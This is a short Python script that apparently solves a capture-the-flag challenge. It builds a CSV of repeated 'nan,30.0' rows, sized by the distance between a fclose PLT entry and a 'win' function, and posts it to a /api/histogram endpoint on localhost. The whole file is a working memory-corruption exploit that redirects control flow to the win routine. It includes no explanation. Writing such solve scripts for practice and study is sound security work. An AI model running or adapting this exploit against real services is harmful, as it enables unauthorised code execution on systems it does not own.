import requests
import os

SCHEME = os.getenv("SCHEME", "http")
HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", ":8080")

addr_win = 0x401268
addr_fclose_plt = 0x401061
delta = addr_win - addr_fclose_plt

csv = b''
for i in range(delta):
    csv += b"nan,30.0\n"

r = requests.post(f"{SCHEME}://{HOST}{PORT}/api/histogram", files={
    'csv': ("test.csv", csv, "text/csv")
}, verify=False)
print(r.text)
